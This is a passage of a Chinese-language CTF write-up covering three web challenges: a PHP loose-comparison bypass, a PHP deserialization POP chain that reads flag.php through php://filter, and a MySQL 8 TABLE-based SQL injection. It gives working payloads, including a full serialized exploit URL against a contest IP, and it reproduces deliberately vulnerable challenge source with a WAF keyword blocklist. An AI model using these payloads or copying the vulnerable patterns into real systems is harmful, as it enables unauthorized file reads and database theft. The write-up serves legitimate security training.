punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>@<span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"items"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//items值为数组</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"items"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">OR</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"items"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">3</span> <span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Sorry~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//要求下标为[1]的元素为数组，且整个items参数长度为3</span>                <span class="token variable">$status</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"skiing"</span><span class="token punctuation">,</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"items"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在items中检索：返回items[i]键在数组中对应的值，与skiing进行比较（弱等于，也就是0与skiing比较会返回true）</span>        <span class="token comment">//字符或字符串与数字比较会将当一个数字与一个字符串/字符进行大小比较时，首先系统尝试将此字符串/字符转换为整型/浮点型，然后进行比较</span>                <span class="token variable">$status</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Sorry~"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span><span class="token comment">//要求status值为true，即items中要有skiing字符串</span>                <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"items"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//理解：使用items下标作为遍历条件，并将inems下标作为键，将键对应的值赋值给$val</span>                        <span class="token variable">$val</span><span class="token operator">===</span><span class="token string double-quoted-string">"skiing"</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Sorry~"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span><span class="token comment">//要求：$val不能完全等于skiing，提示</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$Step2</span><span class="token operator">=</span><span class="token constant boolean">True</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Step1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$Step2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"2022flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> array(0) &#123; &#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h3><blockquote><ol><li>Information传参为json格式</li><li>参数中year不为数字或数字字符串</li><li>参数items为数组类型，且下标为[1]的元素为数组，整个items参数长度为3</li><li>依次将items中元素与字符串skiing进行比较，返回结果要求为true</li><li>items中参数不完全等于(===)skiing</li></ol></blockquote><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><p><code>?Information=&#123;&quot;year&quot;:&quot;2022asdf&quot;,&quot;items&quot;:[0,[1],0]&#125;</code></p><p>参考：</p><p><a href="https://blog.csdn.net/weixin_34129696/article/details/91388238">PHP中的数字与字符串比较</a></p><p>array_search(“red”,$a)函数</p><blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java">在数组中搜索键值 <span class="token string">"red"</span>，并返回它的键名：<span class="token operator">&lt;</span><span class="token operator">?</span>php$a<span class="token operator">=</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"red"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"green"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"blue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>echo <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">"red"</span><span class="token punctuation">,</span>$a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><h3 id="1、环境"><a href="#1、环境" class="headerlink" title="1、环境"></a>1、环境</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">Happy New Year~ MAKE A WISH<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Happy New Year~ MAKE A WISH&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'wish'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'wish'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//对传参wish进行反序列化</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Road_is_Long</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/***************************pop your 2022*****************************/</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Road_is_Long</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$page</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$string</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//对象被当做字符串处理</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">page</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token comment">//当前对象指向page变量，page变量赋值为$file的值(触发__toString())</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//__toString() 方法用于一个类被当成字符串时应怎样回应</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span><span class="token operator">-></span><span class="token property">page</span><span class="token punctuation">;</span><span class="token comment">//返回page(file=&lt;类被实例化时传入的值>)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/file|ftp|http|https|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//在创建Road_is_Long对象时自动调用__wakeup()，参数不包含这些关键字就可以绕过</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You can Not Enter 2022"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">page</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Try_Work_Hard</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span><span class="token comment">//文件包含的变量所指向的值</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Make_a_Change</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$effort</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">effort</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//自动调用该函数，创建一个数组赋值给effort？</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//在读取不可访问得属性时触发，将传入的值传入get()函数</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">effort</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/**********************Try to See flag.php*****************************/</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、解题思路"><a href="#2、解题思路" class="headerlink" title="2、解题思路"></a>2、解题思路</h3><p>将实体对象作为参数，依次触发__construct($file)——&gt;__toString()——-&gt;($effort)__get($key)—–&gt;__invoke()</p><p>注意：当payload中存在私有属性时</p><h3 id="3、payload"><a href="#3、payload" class="headerlink" title="3、payload"></a>3、payload</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Road_is_Long</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$page</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token comment">//用于指向Make_a_Change中的effort</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">page</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"karsa"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Make_a_Change</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$effort</span><span class="token punctuation">;</span><span class="token comment">//将指向的对象结构化的结果放到数组中array()？</span><span class="token punctuation">&#125;</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Try_Work_Hard</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=flag.php'</span> <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Road_is_Long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//触发__toString()</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Make_a_Change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//string指向对象</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span><span class="token operator">-></span><span class="token property">effort</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Try_Work_Hard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//string->effort不可访问，触发__get($key)指向effort，返回一个方法（以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用---->传入$var的值）</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Road_is_Long</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//http://59.110.159.206:7050/?wish=O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3Bs%3A3%3A%22aaa%22%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="MRCTF2020-Ezpop—序列化pop链"><a href="#MRCTF2020-Ezpop—序列化pop链" class="headerlink" title="MRCTF2020]Ezpop—序列化pop链_"></a><a href="https://blog.csdn.net/weixin_43952190/article/details/106016260?ops_request_misc=%7B%22request_id%22:%22165173927916782390531181%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165173927916782390531181&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-106016260.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=ctfpop&spm=1018.2226.3001.4187">MRCTF2020]Ezpop—序列化pop链_</a></h3><p><a href="https://blog.csdn.net/SuichI314/article/details/121788478?ops_request_misc=%7B%22request_id%22:%22165191947416782425140870%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165191947416782425140870&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-20-121788478-null-null.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=web+pop%E5%8E%9F%E7%90%86&spm=1018.2226.3001.4187">Web - pop链构造</a></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="web4、"><a href="#web4、" class="headerlink" title="web4、"></a>web4、</h2><p>[(74条消息) Pwnhub2021七月赛NewSql（mysql8注入）_bfengj的博客-CSDN博客](<a href="https://blog.csdn.net/rfrder/article/details/118726022">https://blog.csdn.net/rfrder/article/details/118726022</a>)</p><blockquote><p>题目描述：</p><p>Beaxia的邮箱地址忘记了，你能帮忙找找吗？</p><p>Where is the database?<br>try ?id</p></blockquote><p>sql注入，注入点id？</p><blockquote><ol><li>id测试到9前都有回显</li><li>8是关键字——-&gt;SQL8特性（table注入）</li><li><a href="http://59.110.159.206:7010/?id=9">http://59.110.159.206:7010/?id=9</a></li></ol></blockquote><p><a href="https://www.anquanke.com/post/id/231627">SQL8特性参考</a></p><blockquote><p>使用场景：当select被禁用时，使用TABLE VALUES语句，</p></blockquote><p>由于TABLE命令和VALUES返回的都是表数据，它们所返回的数据可以通过UNION语句联合起来，当列数不对时会报错，根据这点可以判断列数</p><h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">传参<span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">8</span>？得到信息：Can you find beaxia's email<span class="token operator">?</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">基于SQL8 <span class="token keyword">table</span>、<span class="token keyword">values</span> 特性构造payload：?id<span class="token operator">=</span><span class="token number">8</span> <span class="token keyword">union</span> <span class="token keyword">table</span> emails <span class="token keyword">limit</span> <span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">#</span>得到：ypHeMPardErE<span class="token punctuation">.</span>zip<span class="token variable">@beaxia.cn</span>注意<span class="token comment">----->ypHeMPardErE.zip是一个压缩包文件，url输入，得到压缩包</span>压缩包中是php源码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"./config.php"</span><span class="token punctuation">;</span><span class="token comment">// error_reporting(0);</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Connection failed: "</span> <span class="token operator">.</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Where is the database?"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"try ?id"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">sqlWaf</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|>|&lt;|;|"|\^|\||\ |\'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from users where id=<span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">;</span>    <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/is'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token operator">!==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"No select!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3>"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/h3>&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3>"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/h3>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;br>Error!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">sqlWaf</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'damn hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='$&#123;username&#125;' AND passwd= '$&#123;passwd&#125;'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$passwd</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username or passwd wrong, are you admin?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"wrong user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"user not exist or wrong passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" 